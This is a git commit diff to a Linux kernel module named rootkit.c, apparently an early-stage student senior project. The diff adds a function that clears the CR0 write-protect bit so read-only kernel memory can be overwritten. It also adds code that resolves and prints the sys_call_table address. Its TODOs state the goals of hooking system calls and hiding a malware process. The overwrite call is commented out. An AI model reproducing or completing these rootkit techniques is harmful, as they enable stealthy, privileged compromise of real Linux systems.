3da96649eec82e4504ff3108a4464df08f10aa7e
Owen Flannagan <owenflannagan@ufl.edu>
2021-01-27 18:17:04 -0500

    fix cr0, get syscall address

--- rootkit.c
+++ rootkit.c
@@ -1,17 +1,37 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/kallsyms.h>
+#include <linux/types.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Noop Noop");
 MODULE_DESCRIPTION("Senior Project");
 MODULE_VERSION("0.1");
 
+static void mod_writeonly_mem(uint64_t * addr, uint64_t mem)
+{
+		write_cr0(read_cr0() & ~0x10000);
+		addr[0] = mem;
+		write_cr0(read_cr0() | 0x10000);
+}
+
 static int __init rootkit_init(void)
 {
+		// Declare variables here (ISOC99)
+		uint64_t syscall_table_addr;
+
 		// Here, install initialization procedures
 		printk(KERN_INFO "Initializing...\n");
+
 		// TODO: hook syscall table, reset some function pointers
+		syscall_table_addr = kallsyms_lookup_name("sys_call_table");
+		printk(KERN_INFO "SYSCALL TABLE @ %llx\n", syscall_table_addr);
+
+		// in order to write to syscall table, must fix cr0 to allow write
+		// access first!
+		// mod_writeonly_mem(syscall_table_addr, 0x1234);
+
 		// TODO: find malware process and remove from process list
 		return 0;
 }
